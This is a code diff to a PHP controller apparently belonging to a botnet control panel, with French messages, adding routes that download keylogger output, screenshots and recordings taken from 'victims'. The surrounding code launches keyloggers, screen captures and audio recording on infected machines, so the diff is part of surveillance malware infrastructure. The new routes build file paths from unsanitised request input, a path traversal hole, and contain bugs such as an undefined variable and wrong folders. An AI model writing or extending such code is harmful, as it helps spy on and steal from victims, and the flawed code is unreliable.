@@ -194,6 +194,18 @@ class VictimsController extends Controller
         return redirect("/victims/$victim_id")->with('output', "Keylogger lancé sur la victime.");
     }
 
+    public function keylogger_dl(Request $request)
+    {
+        $keylogger_id = $request->keylogger_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/screenshot/'.$uid.'/'.$keylogger_id.'.png';
+
+        return response()->download($storagePath);
+    }
+
+
     public function autorep(Request $request)
     {
         $victim_id = $request->victim_id;
@@ -213,6 +225,18 @@ class VictimsController extends Controller
 
         return redirect("/victims/$victim_id")->with('output', "Capture d'écran lancée sur la victime.");
     }
+
+    public function screenshot_dl(Request $request)
+    {
+        $screenshot_id = $request->screenshot_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/screenshot/'.$uid.'/'.$record_id.'.png';
+
+        return response()->download($storagePath);
+    }
+
 
     public function picture(Request $request)
     {
@@ -245,6 +269,17 @@ class VictimsController extends Controller
         $record = (new BotnetController)->record($victim_uid, $time);
 
         return redirect("/victims/$victim_id")->with('output', "Enregistrement lancé sur la victime.");
+    }
+
+    public function record_dl(Request $request)
+    {
+        $record_id = $request->record_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/record/'.$uid.'/'.$record_id.'.png';
+
+        return response()->download($storagePath);
     }
 
     public function command(Request $request)
